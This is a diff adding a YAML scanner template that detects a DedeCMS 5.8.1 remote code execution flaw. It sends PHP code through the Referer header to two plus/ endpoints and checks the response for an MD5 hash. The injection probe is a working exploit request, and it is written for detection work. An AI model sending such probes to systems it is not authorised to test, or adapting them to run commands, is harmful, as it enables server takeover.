@@ -1,0 +1,44 @@
+id: dedecms-rce-cve-2021-14063
+
+info:
+  name: DedeCMS 5.8.1 Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    DedeCMS content management system 5.8.1 internal test version common.func.php has a code execution vulnerability. Attackers can use this vulnerability to gain server control permissions.
+  tags: code-execution, rce
+  reference:
+    - https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html
+
+http:
+  - raw:
+      - |
+        GET /plus/flink.php?dopost=save&c=id HTTP/1.1
+        Host: {{Hostname}}
+        Referer: <?php echo "md5"(333);?>
+        X-Requested-With: XMLHttpRequest
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "310dcbbf4cce62f762a2aaa148d556bd"
+
+  - raw:
+      - |
+        GET /plus/vote.php?dopost=view HTTP/1.1
+        Host: {{Hostname}}
+        Referer: <?php echo "md5"(333);?>
+        X-Requested-With: XMLHttpRequest
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "310dcbbf4cce62f762a2aaa148d556bd"
